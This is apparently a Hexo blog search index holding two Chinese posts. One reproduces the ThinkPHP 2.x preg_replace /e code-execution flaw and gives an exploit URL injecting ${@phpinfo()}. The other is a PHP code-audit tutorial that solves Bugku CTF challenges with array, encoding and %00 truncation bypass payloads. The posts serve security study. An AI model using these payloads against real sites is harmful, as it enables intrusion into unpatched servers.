<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>THINKPHP2.X 任意代码执行复现</title>
    <link href="undefined2019/11/21/THINKPHP2-X-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0/"/>
    <url>2019/11/21/THINKPHP2-X-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>版本：thinkphp:2.1</p><p>环境:docker</p><p>漏洞出现在Dispatcher.class.php这个文件中的url解析，代码太多了，只贴关键代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$depr = C(&apos;URL_PATHINFO_DEPR&apos;);</span><br><span class="line">// 分析PATHINFO信息</span><br><span class="line">self::getPathInfo();</span><br><span class="line"></span><br><span class="line">if(!self::routerCheck())&#123;   // 检测路由规则 如果没有则按默认规则调度URL</span><br><span class="line">    $paths = explode($depr,trim($_SERVER[&apos;PATH_INFO&apos;],&apos;/&apos;));</span><br><span class="line">    $var  =  array();</span><br><span class="line">    if (C(&apos;APP_GROUP_LIST&apos;) &amp;&amp; !isset($_GET[C(&apos;VAR_GROUP&apos;)]))&#123;</span><br><span class="line">        $var[C(&apos;VAR_GROUP&apos;)] = in_array(strtolower($paths[0]),explode(&apos;,&apos;,strtolower(C(&apos;APP_GROUP_LIST&apos;))))? array_shift($paths) : &apos;&apos;;</span><br><span class="line">        if(C(&apos;APP_GROUP_DENY&apos;) &amp;&amp; in_array(strtolower($var[C(&apos;VAR_GROUP&apos;)]),explode(&apos;,&apos;,strtolower(C(&apos;APP_GROUP_DENY&apos;))))) &#123;</span><br><span class="line">            // 禁止直接访问分组</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if(!isset($_GET[C(&apos;VAR_MODULE&apos;)])) &#123;// 还没有定义模块名称</span><br><span class="line">        $var[C(&apos;VAR_MODULE&apos;)]  =   array_shift($paths);</span><br><span class="line">    &#125;</span><br><span class="line">    $var[C(&apos;VAR_ACTION&apos;)]  =   array_shift($paths);</span><br><span class="line">    // 解析剩余的URL参数</span><br><span class="line">    $res = preg_replace(&apos;@(\w+)&apos;.$depr.&apos;([^&apos;.$depr.&apos;\/]+)@e&apos;, &apos;$var[\&apos;\\1\&apos;]=&quot;\\2&quot;;&apos;, implode($depr,$paths));</span><br><span class="line">    $_GET   =  array_merge($var,$_GET);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先 $depr变量为PATHINFO模式下，各参数之间的分隔符号。之后调用getPathInfo()函数，此函数获得服务器的PATH_INFO信息，PATH_INFO是PHP的一种路由模式，定位到convention.php配置文件中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// PATHINFO 模式,使用数字1、2、3代表以下三种模式:</span><br><span class="line">    // 1 普通模式(参数没有顺序,例如/m/module/a/action/id/1);</span><br><span class="line">    // 2 智能模式(系统默认使用的模式，可自动识别模块和操作/module/action/id/1/ 或者 /module,action,id,1/...);</span><br><span class="line">    // 3 兼容模式(通过一个GET变量将PATHINFO传递给dispather，默认为s index.php?s=/module/action/id/1)</span><br></pre></td></tr></table></figure><p>重点是后面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$res = preg_replace(&apos;@(\w+)&apos;.$depr.&apos;([^&apos;.$depr.&apos;\/]+)@e&apos;, &apos;$var[\&apos;\\1\&apos;]=&quot;\\2&quot;;&apos;, implode($depr,$paths));</span><br><span class="line">           $_GET   =  array_merge($var,$_GET);</span><br></pre></td></tr></table></figure><p>preg_replace函数e修饰符会将第二个参数当作代码执行，后面赋值时结合双引号执行变量，造成代码执行。</p><p>exp：index.php?s=module/action/param1/${@phpinfo()}，不写马了。</p><p><img src="http://q1kt2tw0a.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20191121232135.jpg" style="zoom:50%;"></p>]]></content>
    
    
    
    <tags>
      
      <tag>PHP代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>浅谈PHP代码审计</title>
    <link href="undefined2019/09/28/%E6%B5%85%E8%B0%88PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>2019/09/28/%E6%B5%85%E8%B0%88PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<p>此文浅谈PHP审计，结合一些代码审计的CTF题目</p><p><strong><em>1.extract变量覆盖</em></strong></p><p>首先需要知道变量覆盖漏洞形成的原理是自己定义的参数替换掉了代码中原有的变量值，一般是函数的使用不当造成的。</p><p>一般引发变量覆盖漏洞的函数有: extract()、parse_str()。其中重点是变量是否可控。</p><p>首先了解extract()函数语法：</p><p>extract(array,extract_rules,prefix)</p><p>extract()定义：extract() 该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。 </p><p>比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = 1;</span><br><span class="line">$b = array(&apos;a&apos;=&gt;&apos;2&apos;);</span><br><span class="line">extract($b);</span><br><span class="line">print($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出结果为2 所以变量a的值成功的被覆盖掉了。</p><p>但是extract()第二参数很重要，决定了已有变量会不会被覆盖掉。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">// 图片外链丢失</span><br></pre></td></tr></table></figure><p>第一种是设置第二参数为EXTR_OVERWRITE，第二种是设置第二参数为EXR_EXISTS。 另一种是extract不传入第二参数默认设置为EXTR_OVERWRITE。</p><p>结合一道变量覆盖的ctf源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag=&apos;xxx&apos;;</span><br><span class="line">extract($_GET);</span><br><span class="line">if(isset($shiyan))</span><br><span class="line">&#123;</span><br><span class="line">$content=trim(file_get_contents($flag));</span><br><span class="line">if($shiyan==$content)</span><br><span class="line">&#123;</span><br><span class="line">echo&apos;flag&#123;xxx&#125;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo&apos;Oh.no&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>分析：<br>extract函数接收了GET请求的参数，从第四行起，判断是否存在变量shiyan，如果存在遍读入变量flag的值，如果变量shiyan==变量content，echo flag。<br>所以让变量为空，构造payload为：<br><a href="http://123.206.87.240:9009/1.php?shiyan=&amp;content" target="_blank" rel="noopener">http://123.206.87.240:9009/1.php?shiyan=&amp;content</a><br>成功echo flag:flag{bugku-dmsj-p2sm3N}</p><p><strong><em>2.strcmp比较字符串</em></strong></p><p>首先看题目就知道重点是strcmp这个函数：<br>int strcmp( string $str1, string $str2)<br>如果 str1 小于 str2 返回 &lt; 0；如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。<br>但是此函数在PHP5.3版本前是可绕过的<br>传入非字符串比如传入数组却能判定相等</p><p>结合题目：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag = &quot;flag&#123;xxxxx&#125;&quot;;</span><br><span class="line">if (isset($_GET[&apos;a&apos;])) &#123;</span><br><span class="line">if (strcmp($_GET[&apos;a&apos;], $flag) == 0) //如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。</span><br><span class="line">//比较两个字符串（区分大小写）</span><br><span class="line">die(&apos;Flag: &apos;.$flag);</span><br><span class="line">else</span><br><span class="line">print &apos;No&apos;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>首先判断是否存在变量a，变量a通过GET方式接收，第四行比较比较变量a与flag，如果为零，die flag。<br>所以构造payload:<br><a href="http://123.206.87.240:9009/6.php?a[]" target="_blank" rel="noopener">http://123.206.87.240:9009/6.php?a[]</a><br>成功echo flag:flag{bugku_dmsj_912k}</p><p><strong><em>3.urldecode二次编码绕过</em></strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;</span><br><span class="line">echo(&quot;</span><br><span class="line"></span><br><span class="line">not allowed!</span><br><span class="line">&quot;);</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line">if($_GET[id] == &quot;hackerDJ&quot;)</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;</span><br><span class="line"></span><br><span class="line">Access granted!</span><br><span class="line">&quot;;</span><br><span class="line">echo &quot;</span><br><span class="line"></span><br><span class="line">flag</span><br><span class="line">&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>eregi()函数:<br>int eregi(string pattern, string string, [array regs]);<br>定义和用法:<br>eregi()函数在一个字符串搜索指定的模式的字符串。搜索不区分大小写。Eregi()可以特别有用的检查有效性字符串,如密码。</p><p>从代码中看，此题echo flag需要满足两个条件:1.变量id不能为字符串hackerDJ,2.通过urldecode解码的id等于字符串hackerDJ<br>首先hackerDJ经过URL编码后为%68%61%63%6B%65%72%44%4A<br>但是浏览器会对提交的参数自动进行一次解码，则第一个条件不满足，所以需要再进行一次编码，编码后为：%2568%2561%2563%256B%2565%2572%2544%254A<br>这样既能满足第一个条件，也能满足第二个条件。</p><p>所以构造payload:<br><a href="http://123.206.87.240:9009/10.php?id=%2568%2561%2563%256B%2565%2572%2544%254A" target="_blank" rel="noopener">http://123.206.87.240:9009/10.php?id=%2568%2561%2563%256B%2565%2572%2544%254A</a><br>成功echo flag:<br>Access granted!</p><p>flag{bugku__daimasj-1t2} </p><p><strong><em>4.md5()函数</em></strong></p><p>看题目就知道重点是md5()函数<br>MD5()函数语法：<br>md5 — 计算字符串的 MD5 散列值<br>string md5( string str[, bool raw_output = false] )</p><p>md5()函数有个特点，同样不能处理数组。</p><p>结合题目：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$flag = &apos;flag&#123;test&#125;&apos;;</span><br><span class="line">if (isset($_GET[&apos;username&apos;]) and isset($_GET[&apos;password&apos;])) &#123;</span><br><span class="line">if ($_GET[&apos;username&apos;] == $_GET[&apos;password&apos;])</span><br><span class="line">print &apos;Your password can not be your username.&apos;;</span><br><span class="line">else if (md5($_GET[&apos;username&apos;]) === md5($_GET[&apos;password&apos;]))</span><br><span class="line">die(&apos;Flag: &apos;.$flag);</span><br><span class="line">else</span><br><span class="line">print &apos;Invalid password&apos;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>首先判断是否存在变量username和变量password，如果变量username等于变量password，则不能成功echo flag，但是如果他们的md5值相等的话，die flag.<br>前面说过md5()不能处理数组，所以构造flag：<br><a href="http://123.206.87.240:9009/18.php?username[]=0&amp;password[]=1" target="_blank" rel="noopener">http://123.206.87.240:9009/18.php?username[]=0&amp;password[]=1</a><br>成功die flag:flag{bugk1u-ad8-3dsa-2}</p><p><strong><em>5.ereg正则%00截断</em></strong></p><p>同样看题目就能知道重点是ereg()函数</p><p>ereg()函数语法：<br>int ereg ( string $pattern , string $string [, array &amp;$regs ] )<br>以区分大小写的方式在 string 中寻找与给定的正则表达式 pattern 所匹配的子串。<br>如果找到与 pattern 中圆括号内的子模式相匹配的子串并且函数调用给出了第三个参数 regs，则匹配项将被存入 regs 数组中。regs[1] 包含第一个左圆括号开始的子串，regs[2] 包含第二个子串，以此类推。regs[0] 包含整个匹配的字符串。<br>如果在 string 中找到 pattern 模式的匹配则返回所匹配字符串的长度，如果没有找到匹配或出错则返回 FALSE。如果没有传递入可选参数 regs 或者所匹配的字符串长度为 0，则本函数返回 1。</p><p>结合题目：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag = &quot;xxx&quot;;</span><br><span class="line">if (isset ($_GET[&apos;password&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&apos;password&apos;]) === FALSE)</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;</span><br><span class="line"></span><br><span class="line">You password must be alphanumeric</span><br><span class="line">&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else if (strlen($_GET[&apos;password&apos;]) &lt; 8 &amp;&amp; $_GET[&apos;password&apos;] &gt; 9999999)</span><br><span class="line">&#123;</span><br><span class="line">if (strpos ($_GET[&apos;password&apos;], &apos;-&apos;) !== FALSE) //strpos — 查找字符串首次出现的位置</span><br><span class="line">&#123;</span><br><span class="line">die(&apos;Flag: &apos; . $flag);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo(&apos;</span><br><span class="line"></span><br><span class="line">- have not been found</span><br><span class="line">&apos;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;</span><br><span class="line"></span><br><span class="line">Invalid password</span><br><span class="line">&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>首先ereg判断password只能是字母加数字的形式，并且password的长度必须小于8，password的值大于9999999，die flag。还有一个条件就是如果password里存在 “-”，也能得到flag。<br>所以可以用数组绕过的方式构造payload 也能通过ereg截断的方式绕过正则判断:%00<br>1.构造payload：<a href="http://123.206.87.240:9009/5.php?password[]=1000000" target="_blank" rel="noopener">http://123.206.87.240:9009/5.php?password[]=1000000</a><br>2.构造payload:  <a href="http://123.206.87.240:9009/5.php?password=1e9%00星号-星号" target="_blank" rel="noopener">http://123.206.87.240:9009/5.php?password=1e9%00星号-星号</a><br>成功die flag:flag{bugku-dm-sj-a12JH8}</p><p><strong><em>6.数组返回NULL绕过</em></strong></p><p>又是一道数组绕过的题目：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag = &quot;flag&quot;;</span><br><span class="line"></span><br><span class="line">if (isset ($_GET[&apos;password&apos;])) &#123;</span><br><span class="line">if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&apos;password&apos;]) === FALSE)</span><br><span class="line">echo &apos;You password must be alphanumeric&apos;;</span><br><span class="line">else if (strpos ($_GET[&apos;password&apos;], &apos;--&apos;) !== FALSE)</span><br><span class="line">die(&apos;Flag: &apos; . $flag);</span><br><span class="line">else</span><br><span class="line">echo &apos;Invalid password&apos;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>通过题目代码第五行可以知道 条件是password只能是字母数字，第七行条件是匹配password，如果存在“–”便die flag，所以很简单<br>直接构造payload:<br>payload1:<a href="http://123.206.87.240:9009/19.php?password[]=" target="_blank" rel="noopener">http://123.206.87.240:9009/19.php?password[]=</a><br>payload2:<a href="http://123.206.87.240:9009/19.php?password=abc%00--" target="_blank" rel="noopener">http://123.206.87.240:9009/19.php?password=abc%00--</a><br>成功得到flag:flag{ctf-bugku-ad-2131212}</p><p><strong><em>7.strpos数组绕过</em></strong></p><p>感觉还是很眼熟，很眼熟</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag = &quot;flag&quot;;</span><br><span class="line">if (isset ($_GET[&apos;ctf&apos;])) &#123;</span><br><span class="line">if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&apos;ctf&apos;]) === FALSE)</span><br><span class="line">echo &apos;必须输入数字才行&apos;;</span><br><span class="line">else if (strpos ($_GET[&apos;ctf&apos;], &apos;#biubiubiu&apos;) !== FALSE)</span><br><span class="line">die(&apos;Flag: &apos;.$flag);</span><br><span class="line">else</span><br><span class="line">echo &apos;骚年，继续努力吧啊~&apos;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>直接看题目代码第四行起，得知ctf的参数必须为数字，并且strpos()匹配ctf的值存在”#biubiubiu”便输出flag。很简单，还是数组绕过，换汤不换药。<br>所以构造payload:<a href="http://123.206.87.240:9009/15.php?ctf[]=#biubiubiu" target="_blank" rel="noopener">http://123.206.87.240:9009/15.php?ctf[]=#biubiubiu</a><br>成功die flag:flag{Bugku-D-M-S-J572}</p><p><strong><em>8.数字验证正则绕过</em></strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$flag = &apos;flag&#123;test&#125;&apos;;</span><br><span class="line">if (&quot;POST&quot; == $_SERVER[&apos;REQUEST_METHOD&apos;])</span><br><span class="line">&#123;</span><br><span class="line">$password = $_POST[&apos;password&apos;];</span><br><span class="line">if (0 &gt;= preg_match(&apos;/^[[:graph:]]&#123;12,&#125;$/&apos;, $password)) //preg_match — 执行一个正则表达式匹配</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;flag&apos;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">while (TRUE)</span><br><span class="line">&#123;</span><br><span class="line">$reg = &apos;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&apos;;</span><br><span class="line">if (6 &gt; preg_match_all($reg, $password, $arr))</span><br><span class="line">break;</span><br><span class="line">$c = 0;</span><br><span class="line">$ps = array(&apos;punct&apos;, &apos;digit&apos;, &apos;upper&apos;, &apos;lower&apos;); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母</span><br><span class="line">foreach ($ps as $pt)</span><br><span class="line">&#123;</span><br><span class="line">if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password))</span><br><span class="line">$c += 1;</span><br><span class="line">&#125;</span><br><span class="line">if ($c &lt; 3) break;</span><br><span class="line">//&gt;=3，必须包含四种类型三种与三种以上</span><br><span class="line">if (&quot;42&quot; == $password) echo $flag;</span><br><span class="line">else echo &apos;Wrong password&apos;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>看题目知道是需要绕过正则匹配规则得到flag，直接分析代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if (&quot;POST&quot; == $_SERVER[&apos;REQUEST_METHOD&apos;])</span><br><span class="line">&#123;</span><br><span class="line">$password = $_POST[&apos;password&apos;];</span><br><span class="line">if (0 &gt;= preg_match(&apos;/^[[:graph:]]&#123;12,&#125;$/&apos;, $password)) //preg_match — 执行一个正则表达式匹配</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;flag&apos;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第四行设置全局变量SERVER==POST，post方法传输数据。<br>第一个条件执行一个preg_match正则匹配，如果匹配结果为1,echo 字符串flag，否则执行exit退出程序。<br>虽然输出字符串flag，但也不能让它执行exit，所以需要第一个条件需要满足：<br>[:graph:]在正则表达式里指除空格符以外的标点字符。{12,}代表必须匹配12次以上。<br>比如构造:password=1111111111111111111111</p><p>继续第二个条件:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$reg = &apos;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&apos;;</span><br><span class="line">if (6 &gt; preg_match_all($reg, $password, $arr))</span><br><span class="line">break;</span><br></pre></td></tr></table></figure><p>[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母<br>要满足第二个条件需要全局匹配任何标点大小写数字，匹配次数必须大于六，并且要满足第一个条件，可以构造:password=11aaBB.11aa</p><p>继续第三个条件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ps = array(&apos;punct&apos;, &apos;digit&apos;, &apos;upper&apos;, &apos;lower&apos;); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母</span><br><span class="line">foreach ($ps as $pt)</span><br><span class="line">&#123;</span><br><span class="line">if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password))</span><br><span class="line">$c += 1;</span><br><span class="line">&#125;</span><br><span class="line">if ($c &lt; 3) break;</span><br></pre></td></tr></table></figure><p>每匹配成功一次，变量c + 1,以此类推，如果c小于3，break。<br>所以要满足条件至少需要3种类型字符。</p><p>继续第四个条件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (&quot;42&quot; == $password) echo $flag;</span><br><span class="line">else echo &apos;Wrong password&apos;;</span><br><span class="line">exit;</span><br></pre></td></tr></table></figure><p>如果password==42，echo flag。<br>所以结合四个条件构造flag:<br>123.206.87.240:9009/21.php?password=42..11aaBBcc<br>成功echo flag:flag{Bugku_preg_match}</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//图片外链丢失</span><br></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>PHP代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>